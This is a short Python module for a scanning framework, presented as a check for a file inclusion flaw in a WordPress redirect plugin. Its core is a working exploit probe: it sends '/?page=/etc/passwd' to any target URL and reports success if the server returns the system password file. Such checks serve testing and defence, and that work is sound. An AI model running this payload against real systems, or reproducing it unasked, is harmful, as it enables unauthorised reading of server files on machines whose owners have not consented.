import logging
from hmc.modules import Module, Argument
from urllib.parse import urljoin, urlencode

log = logging.getLogger("hmc")

class WPRedirectLfiCheck(Module):
    module_name = "wp_redirect_lfi_check"
    module_desc = "Simple 301 Redirects Plugin LFI Check (CVE-2021-24347)"
    module_auth = "sk1ll3ss"

    module_args = [
        Argument("url", desc="Target URL (e.g., http://example.com)")
    ]

    async def execute(self, url):

        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        payload = "/?page=/etc/passwd"
        full_url = urljoin(url, payload)

        try:
            response = await self.env.get(full_url)

            if "root:x:0:0:" in response.body:
                self.log_success("[+] Target vulnerable to LFI via Simple 301 Redirects!")
                return {"vuln": True}
            else:
                self.log_failure("[-] Target not vulnerable or payload sanitized.")
                return {"vuln": False}
        except Exception as e:
            self.log_failure(f"[-] Error: {e}")
            return {"vuln": False}
